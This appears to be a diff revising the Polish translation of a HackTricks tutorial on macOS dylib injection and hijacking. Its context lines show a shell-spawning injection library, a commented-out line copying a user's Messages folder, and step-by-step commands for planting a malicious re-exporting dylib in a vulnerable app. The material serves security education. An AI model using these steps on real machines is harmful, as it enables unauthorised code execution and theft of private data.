@@ -6,17 +6,17 @@
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
+* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
-## Przykład podstawowy DYLD\_INSERT\_LIBRARIES
+## DYLD\_INSERT\_LIBRARIES Podstawowy przykład
 
-**Biblioteka do wstrzykiwania** w celu wykonania powłoki:
+**Biblioteka do wstrzyknięcia** w celu wykonania powłoki:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -34,7 +34,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-Binarny plik do ataku:
+Binarny do ataku:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -87,16 +87,12 @@ current version 1.0.0
 compatibility version 1.0.0
 # Check the versions
 ```
-{% endcode %}
-{% endtab %}
-{% endtabs %}
-
 Z poprzednich informacji wiemy, że **nie sprawdza sygnatury załadowanych bibliotek** i **próbuje załadować bibliotekę z**:
 
-* `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
-* `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
+- `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
+- `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
 
-Jednak pierwsza z nich nie istnieje:
+Jednak pierwsza nie istnieje:
 ```bash
 pwd
 /Applications/VulnDyld.app
@@ -104,7 +100,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Więc jest możliwe przejęcie kontroli nad tym! Stwórz bibliotekę, która **wykonuje dowolny kod i eksportuje te same funkcje** co prawdziwa biblioteka, poprzez ponowne eksportowanie jej. I pamiętaj, aby ją skompilować z oczekiwanymi wersjami:
+Więc jest to możliwe do przechwycenia! Stwórz bibliotekę, która **wykonuje pewien arbitralny kod i eksportuje te same funkcjonalności** co prawidłowa biblioteka poprzez ponowne eksportowanie jej. I pamiętaj, aby ją skompilować z oczekiwanymi wersjami:
 
 {% code title="lib.m" %}
 ```objectivec
@@ -126,7 +122,7 @@ gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Found
 ```
 {% endcode %}
 
-Ścieżka reeksportu utworzona w bibliotece jest względna do ładowacza, zmieńmy ją na ścieżkę bezwzględną do biblioteki do eksportu:
+Ścieżka reeksportu utworzona w bibliotece jest względna dla ładowacza, zmieńmy ją na bezwzględną ścieżkę do biblioteki do eksportu:
 
 {% code overflow="wrap" %}
 ```bash
@@ -147,7 +143,7 @@ name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Con
 ```
 {% endcode %}
 
-Na koniec po prostu skopiuj go do **zajętego miejsca**:
+Ostatecznie po prostu skopiuj go do **przechwyconego miejsca**:
 
 {% code overflow="wrap" %}
 ```bash
@@ -155,20 +151,20 @@ cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
 {% endcode %}
 
-I **wykonaj** binarny plik i sprawdź, czy **biblioteka została załadowana**:
+I **uruchom** binarny i sprawdź, czy **biblioteka została załadowana**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
-<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib przechwycona w /Applications/VulnDyld.app/Contents/Resources/lib/binary
+<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
 </strong>Usage: [...]
 </code></pre>
 
 {% hint style="info" %}
-Ciekawy artykuł na temat wykorzystania tej podatności do nadużywania uprawnień kamery w Telegramie można znaleźć pod adresem [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+Świetny artykuł na temat wykorzystania tej podatności do nadużywania uprawnień kamery w Telegramie można znaleźć pod adresem [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 {% endhint %}
 
 ## Na większą skalę
 
-Jeśli planujesz próbować wstrzykiwać biblioteki w nieoczekiwane pliki binarne, możesz sprawdzić komunikaty zdarzeń, aby dowiedzieć się, kiedy biblioteka jest ładowana wewnątrz procesu (w tym przypadku usuń printf i wykonanie `/bin/bash`).
+Jeśli planujesz próbować wstrzykiwać biblioteki w nieoczekiwane binaria, możesz sprawdzić komunikaty zdarzeń, aby dowiedzieć się, kiedy biblioteka jest ładowana wewnątrz procesu (w tym przypadku usuń printf i wykonanie `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
@@ -178,10 +174,10 @@ sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
+* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF** sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.
 
 </details>
